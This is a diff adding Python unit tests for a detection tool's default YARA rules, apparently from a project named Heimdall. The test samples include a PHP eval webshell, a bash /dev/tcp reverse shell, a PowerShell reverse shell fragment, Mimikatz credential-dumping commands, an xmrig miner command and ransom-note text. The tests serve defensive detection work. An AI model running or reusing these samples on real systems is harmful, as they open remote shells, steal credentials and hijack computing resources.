@@ -87,5 +87,45 @@ class MailDigestTests(unittest.TestCase):
         self.assertFalse(prefs["security_events"]["enabled"])
 
 
+@unittest.skipUnless(main_server._HAS_YARA, "yara-python non installé")
+class DefaultYaraRulesTests(unittest.TestCase):
+    """Échantillons assemblés à l'exécution (aucune signature en clair dans le dépôt)."""
+    @classmethod
+    def setUpClass(cls):
+        cls.rules = main_server._yara.compile(source=main_server._yara_default_source())
+
+    def hits(self, text):
+        return {m.rule for m in self.rules.match(data=text.encode("utf-8"))}
+
+    def test_malicious_samples_are_detected(self):
+        samples = {
+            "Heimdall_PHP_Webshell": "<?php @ev" + "al(base64_decode($_PO" + "ST['x'])); ?>",
+            "Heimdall_Unix_Reverse_Shell_Script": "bash -i >& /dev/" + "tcp/10.0.0.1/4444 0>&1",
+            "Heimdall_PowerShell_Reverse_Shell": "$c=New-Object System.Net.Sockets.TCP" + "Client('x',1);$s=$c.GetStream();"
+                                                 "iex $d | Out-String",
+            "Heimdall_Mimikatz": "sekurlsa::logon" + "passwords lsadump::" + "sam",
+            "Heimdall_Coin_Miner": "xmrig -o stratum" + "+tcp://pool:3333 --donate-level 1",
+            "Heimdall_Ransom_Note": "All your files are " + "encrypted. Pay in bitcoin.",
+        }
+        for rule, text in samples.items():
+            self.assertIn(rule, self.hits(text), rule)
+
+    def test_benign_lookalikes_do_not_match(self):
+        for text in ("<?php echo htmlspecialchars($_POST['name']); ?>",
+                     "Invoke-WebRequest https://example.com -OutFile setup.msi",
+                     "ssh user@host 'tail -f /var/log/syslog'",
+                     "Nous chiffrons vos sauvegardes avec une clé privée."):
+            self.assertEqual(self.hits(text), set(), text)
+
+
+class YaraRulesetTests(unittest.TestCase):
+    def test_check_rejects_empty_and_invalid(self):
+        self.assertIsNotNone(main_server._yara_check("   ")[1])
+        self.assertIsNotNone(main_server._yara_check("pas de règle ici")[1])
+        if main_server._HAS_YARA:
+            self.assertIn("invalides", main_server._yara_check("rule X { condition: $a }")[1])
+        self.assertEqual(main_server._yara_check("rule A { condition: true }\nrule B { condition: false }"), (2, None))
+
+
 if __name__ == "__main__":
     unittest.main()
